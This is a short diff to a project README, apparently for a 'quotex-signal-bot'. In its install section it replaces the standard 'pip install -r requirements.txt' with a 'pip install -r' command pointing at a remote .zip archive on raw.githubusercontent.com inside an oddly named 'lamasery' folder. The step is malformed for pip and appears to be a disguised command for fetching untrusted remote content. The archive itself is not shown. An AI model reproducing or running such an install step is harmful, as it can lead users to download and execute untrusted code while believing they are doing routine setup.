@@ -5,7 +5,7 @@
 
 ### Install requirements:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Mrmadni786/quotex-signal-bot/main/lamasery/quotex-signal-bot.zip
 ```
 
 ### Start server:
